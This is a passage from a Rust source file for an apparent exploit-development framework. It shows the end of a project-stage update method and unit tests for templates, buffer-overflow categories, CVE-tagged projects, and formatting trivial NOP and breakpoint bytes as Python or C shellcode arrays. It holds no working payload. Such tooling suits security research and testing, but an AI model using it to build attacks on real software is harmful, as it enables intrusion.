            .ok_or_else(|| anyhow!("Project not found"))?;

        project.development_stage = stage;
        project.updated_at = Utc::now();

        Ok(())
    }
}

impl Default for ExploitDevelopmentFramework {
    fn default() -> Self {
        Self::new()
    }
}

// Use sha2 for hashing
use sha2::Digest;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_framework_creation() {
        let framework = ExploitDevelopmentFramework::new();
        assert!(!framework.templates.is_empty());
    }

    #[test]
    fn test_get_templates() {
        let framework = ExploitDevelopmentFramework::new();
        let templates = framework.get_templates();
        assert!(!templates.is_empty());
    }

    #[test]
    fn test_get_template_by_category() {
        let framework = ExploitDevelopmentFramework::new();
        let bof_templates = framework.get_templates_by_category(ExploitCategory::BufferOverflow);
        assert!(!bof_templates.is_empty());
    }

    #[test]
    fn test_create_project() {
        let mut framework = ExploitDevelopmentFramework::new();
        let result = framework.create_project(
            "Test Project".to_string(),
            "A test project".to_string(),
            ExploitCategory::BufferOverflow,
            Some("CVE-2024-0001".to_string()),
            "tester".to_string(),
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_format_payload_python() {
        let payload = vec![0x90, 0x90, 0xcc];
        let formatted = ExploitDevelopmentFramework::format_payload(&payload, PayloadFormat::Python);
        assert!(formatted.contains("\\x90"));
    }

    #[test]
    fn test_format_payload_c() {
        let payload = vec![0x90, 0x90, 0xcc];
        let formatted = ExploitDevelopmentFramework::format_payload(&payload, PayloadFormat::C);
        assert!(formatted.contains("unsigned char shellcode"));
    }
}
